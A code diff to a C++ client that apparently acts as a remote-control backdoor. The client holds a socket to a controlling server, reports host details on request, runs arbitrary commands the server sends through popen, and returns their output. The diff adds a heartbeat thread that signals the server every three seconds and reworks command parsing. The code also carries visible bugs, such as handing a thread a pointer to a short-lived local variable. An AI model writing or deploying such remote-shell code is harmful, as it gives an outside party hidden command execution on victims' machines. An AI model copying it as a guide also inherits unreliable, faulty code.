@@ -19,6 +19,7 @@
 #define MAXFILE 65535
 using namespace std;
 pthread_t sendTid;
+pthread_t heartTid;
 int sockfd;
 int conn;
 BlockingQueue<string>* sendqueue;
@@ -27,6 +28,7 @@ void* Send(void* ptr);
 void* Execute(void* ptr);
 void SendExit(int i);
 void nonehandle(int i);
+void* SendHeart(void* ptr);
 int main()
 {
 	pid_t pc, pid;
@@ -75,6 +77,7 @@ int main()
 			conn = 1;
 			sendqueue = new BlockingQueue<string>();
 			pthread_create(&sendTid,NULL,Send,NULL);
+			pthread_create(&heartTid, NULL, SendHeart, NULL);
 		}
 		while (1)
 		{
@@ -85,10 +88,11 @@ int main()
 				conn = 0;
 				cout << "disconn" << endl;
 				pthread_kill(sendTid, SIGCHLD);
+				pthread_kill(heartTid, SIGCHLD);
 				break;
 			}
 			
-			if ((string)buf == "name")
+			if (strcmp(buf, "name") == 0)
 			{
 					//获取主机信息
 					char computer[256];
@@ -104,31 +108,33 @@ int main()
 						sendqueue->push(info);
 					}
 			}
-			else if ((string)buf == "close")
+			else if (strcmp(buf,"close")==0)
 			{
 				conn = 0;
 				cout << "disconn" << endl;
 				pthread_kill(sendTid, SIGCHLD);
+				pthread_kill(heartTid, SIGCHLD);
 				shutdown(sockfd, SHUT_RDWR);
 				close(sockfd);
 				exit(0);
 				break;
 			}
-			else if ((string)buf == "cmd")
+			else if (strcmp(buf,"cmd")==0)
 			{
-				char* cmd;
+				char* cmd=NULL;
 				if (recvLenAndData(sockfd, cmd) == 0)
 				{
 					
 					conn = 0;
 					cout << "disconn" << endl;
 					pthread_kill(sendTid, SIGCHLD);
-					
+					pthread_kill(heartTid, SIGCHLD);
 					break;
 				}
 				//cout << cmd << endl;
 				pthread_t tid;
-				pthread_create(&tid, NULL, Execute, cmd);
+				pthread_create(&tid, NULL, Execute, &cmd);
+				
 			
 			}
 			if(buf!=NULL)
@@ -140,11 +146,11 @@ int main()
 }
 void nonehandle(int i)
 {
-	
+
 }
 void* Execute(void* ptr)
 {
-	char* cmd =(char*)ptr;
+	char* cmd =*(char**)ptr;
 	string result = cmd_system(cmd);
 	if (result.length() > 0)
 	{
@@ -170,19 +176,31 @@ void* Send(void* ptr)
 		sendLenAndData(sockfd, msg);
 	}
 }
+void* SendHeart(void* ptr)
+{
+	signal(SIGCHLD, SendExit);
+	while (true)
+	{
+		sendqueue->push("1");
+		sleep(3);
+	}
+}
 void SendExit(int i)
 {
 	if (conn == 0)
 	{
 		cout << "send thread exit" << endl;
 		pthread_exit(PTHREAD_CANCELED);
-		delete[] sendqueue;
+		delete sendqueue;
 	}
 }
 string cmd_system(char* command)
 {
-	signal(SIGCHLD, nonehandle);
-	if (command[0] == 'c' && command[1] == 'd')
+	if (command == NULL)
+	{
+		return "no";
+	}
+	if (strlen(command)>0&&command[0] == 'c' && command[1] == 'd')
 	{
 		string dir(command, 3, sizeof(command));
 		chdir(dir.c_str());
@@ -191,11 +209,10 @@ string cmd_system(char* command)
 	else
 	{
 		string result = "";
+
 		FILE* fpRead;
-		char* temp=new char[strlen(command)+5];
-		strcat(temp, command);
-		strcat(temp, " 2>&1");
-		fpRead = popen(temp, "r");
+		fpRead = popen(command, "r");
+		sendqueue->push(command);
 		char buf[1024];
 		memset(buf, '\0', sizeof(buf));
 		while (fgets(buf, sizeof(buf), fpRead) != NULL)
@@ -204,7 +221,6 @@ string cmd_system(char* command)
 		}
 		if (fpRead != NULL)
 			pclose(fpRead);
-		delete temp;
 		return result;
 	}
 }
